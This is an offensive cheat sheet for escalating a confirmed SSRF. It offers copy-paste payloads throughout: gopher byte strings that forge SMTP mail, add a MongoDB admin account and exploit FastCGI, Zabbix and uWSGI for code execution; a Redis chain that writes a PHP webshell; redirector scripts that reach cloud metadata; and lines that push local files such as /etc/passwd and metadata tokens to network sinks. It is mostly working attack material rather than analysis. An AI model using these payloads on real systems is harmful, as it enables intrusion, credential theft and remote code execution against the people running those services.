# Escalate a working SSRF — runnable gopher byte-strings, protocol-smuggling gadgets, blind-read chains — Open WHEN: you have a confirmed SSRF that reaches an internal TCP service or metadata endpoint and need a copy-paste payload to turn it into data/RCE

Owner body already lists metadata endpoints, gopher concept, file/jar/netdoc wrappers,
PDF/SVG SSRF, and Gopherus existence. Below are the ACTUAL byte-strings and gadget recipes.

## Gopher — raw SMTP send (CRLF = %0D%0A, double-encode body as %250d%250a)
```
ssrf.php?url=gopher://127.0.0.1:25/_MAIL%20FROM:<a@x.com>%0D%0A
gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aSubject%3A%20x%250d%250a%250d%250abody%250d%250a.%250d%250aQUIT%250d%250a
```

## Gopher — raw HTTP to a loopback-only listener
```
gopher://<host>:8080/_GET / HTTP/1.0%0A%0A
gopher://<host>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```

## Gopher — MongoDB create admin user (DiceCTF 2023 string)
```
curl 'gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%07%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00%00%00administrator%00%00%00%00'
```

## Gopher payload generators (don't hand-craft these)
- `Gopherus` — emits gopher strings for: MySQL, PostgreSQL, FastCGI, Redis, Zabbix, Memcache.
- `remote-method-guesser --ssrf --gopher` — Java RMI gopher payloads.

## dict:// / ldap:// raw-line injection to text protocols
```
ssrf.php?url=dict://attacker:11111/
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit     # %0a injects memcached cmds
```

## Redis -> PHP webshell via dict:// (each line is one Redis command)
Point dump dir at the webroot, name the dump `.php`, store shell code, SAVE.
```
dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php
dict://127.0.0.1:6379/SET%20mykey%20"<\x3Fphp system($_GET[0])\x3F>"
dict://127.0.0.1:6379/SAVE
# then: GET /file.php?0=id
```
Same via gopher (`_` + url-encoded `config set dir ...` / `set ...` / `save`).

## MySQL / Memcached / PostgreSQL / FastCGI / Zabbix — generate with Gopherus
```
python2 gopherus.py --exploit mysql        # asks for user (no password) + query
python2 gopherus.py --exploit pymemcache    # rbmemcache / phpmemcache / dmpmemcache variants
python2 gopherus.py --exploit fastcgi       # needs a known PHP file path on disk
python2 gopherus.py --exploit zabbix
```
FastCGI raw form (RCE via `PHP_VALUE` overriding `auto_prepend_file=php://input`;
default script `/usr/share/php/PEAR.php`):
```
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00...SCRIPT_FILENAME/usr/share/php/PEAR.php...%3C%3Fphp%20system%28%27id%27%29%3F%3E
```

## Zabbix agent remote command (EnableRemoteCommands=1)
```
gopher://127.0.0.1:10050/_system.run%5B%28id%29%3Bsleep%202s%5D
```

## uWSGI exec via gopher (uwsgi_exp.py builds the full string)
```
gopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py
```
modifier1=%00, datasize=%1A%00, then key `UWSGI_FILE` -> value = path to a
.py the attacker first writes to disk.

## Internal DNS zone transfer (AXFR) over gopher -> subdomain list
SSRF to the internal resolver (TCP/53) with a raw AXFR query enumerates the
zone. Build the byte-string in Python (QTYPE AXFR = 252, QCLASS IN = 1):
```py
from urllib.parse import quote
domain, tld = "example.lab".split('.')
r  = b"\x01\x03\x03\x07\x00\x01\x00\x00\x00\x00\x00\x00"
r += len(domain).to_bytes(1,'big') + domain.encode()
r += len(tld).to_bytes(1,'big') + tld.encode()
r += b"\x00\x00\xFC\x00\x01"
print('gopher://127.0.0.1:53/_' + quote(len(r).to_bytes(2,'big') + r))
```

## SMTP banner -> internal hostname enumeration
SSRF to `localhost:25`, read line 1 (`220 host.internaldomain.com ESMTP`), then
search that internal domain on GitHub for subdomains to pivot to.

## Redirect server -> gopher (when sink follows redirects but blocks gopher scheme)
Serve a 301 whose `Location:` is a gopher URL; point the SSRF at your http(s) redirector.
Minimal Flask redirector:
```python
from flask import Flask, redirect
app = Flask(__name__)
@app.route('/')
def r(): return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54...', code=301)
app.run(ssl_context='adhoc', host="0.0.0.0", port=8443)
```
Full wsman/SCX RCE gopher string (Linux OMI, exec via base64|bash) is the long
`%50%4f%53%54%20%2f%77%73%6d%61%6e...` blob to put in that `Location:`.

## SNI-proxy SSRF (Nginx ssl_preread routes by SNI field)
```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```

## Java TLS AIA CA-Issuers SSRF (fires during handshake, pre-HTTP; mTLS only)
Server started with `-Dcom.sun.security.enableAIAcaIssuers=true` dereferences the
AIA CA-Issuers URI from a client cert. Present a cert whose AIA = `http://your-host:8080`.
```bash
nc -l 8080 -k    # observe outbound fetch
curl https://mtls-server:8444 --key client-aia-key.pem --cert client-aia-cert.pem --cacert ca.pem
# DoS variant: AIA = file:///dev/urandom  -> Java reads unbounded bytes, pins a core
```

## CFITSIO Extended Filename Syntax (filename = a DSL, not a path)
A `fits_open_file()` sink that takes user input is an SSRF interpreter:
```
https://attacker.example/payload(/var/www/html/grabbed.bin)     # fetch + persist to webroot
/etc/passwd(root://127.0.0.1:1094//loot)[b500,1][*,*]           # read local -> push to net sink
```
CR/LF in the filename injects metadata headers through raw HTTP drivers:
```
$'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1\nMetadata-Flavor: Google\nfoo:(/tmp/gcp-token.txt)'
```
Probe for: scheme prefixes, `(outfile)` clauses, `[selectors]`, write/create backends.

## HTML-to-PDF renderers as blind SSRF (TCPDF / spipu-html2pdf)
Each `<img>`/`<link>` href is fetched server-side via cURL/`file_get_contents`.
```html
<img width="1" height="1" src="http://127.0.0.1:8080/healthz">
<link rel="stylesheet" href="http://169.254.169.254/latest/meta-data/">
```
TCPDF 6.10.0 retries each `<img>` several times -> good for timing-based port scan.

## Blind -> readable: status-code redirect loop (libcurl normalises 305-310 to "follow")
Some apps drop format checks after N "weird" redirects and dump the whole chain + body
(incl. metadata JSON). Redirector that pumps 305->310 then 302 to the metadata URL:
```python
@app.route("/redir")
def redir():
    c = int(request.args.get("count", 0)) + 1
    if c >= 10: return redirect("http://169.254.169.254/latest/meta-data/", 302)
    return redirect(f"/redir?count={c}", 301 + c)   # 305,306,307,308,309,310...
```

## url= command-injection probe (when fetcher shells out)
```
url=http://<oast-id>.oast.site?`whoami`
```
